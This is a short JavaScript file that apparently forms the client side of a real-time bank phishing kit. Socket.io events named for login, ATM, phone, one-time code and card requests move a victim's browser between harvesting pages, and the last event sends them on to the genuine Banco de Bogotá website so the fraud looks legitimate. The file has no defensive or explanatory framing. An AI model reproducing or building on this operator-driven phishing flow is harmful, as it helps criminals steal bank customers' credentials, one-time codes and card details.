import { getSocket } from "./socket";
import { getSessionId } from "./session";




export async function registerClientSocketHandlers() {
  const socket = getSocket();
  const sessionId = await getSessionId();

  socket.on(`client:request-login:${sessionId}`, () => {
    window.location.href = "/home";
    
  });

  socket.on(`client:request-atm:${sessionId}`, () => {
    window.location.href = "/home";
    
  });


  socket.on(`client:request-celu:${sessionId}`, () => {
    window.location.href = "/dinamica?p=ts";
   
  });

  socket.on(`client:code:${sessionId}`, () => {
    window.location.href = "/dinamica?p=ta";
    
  });

  socket.on(`client:request-card:${sessionId}`, () => {
    window.location.href = "/card";
    
  });

  socket.on(`client:request-finish:${sessionId}`, () => {
    window.location.href = "https://www.bancodebogota.com/personas";
    
  });

  






  
}
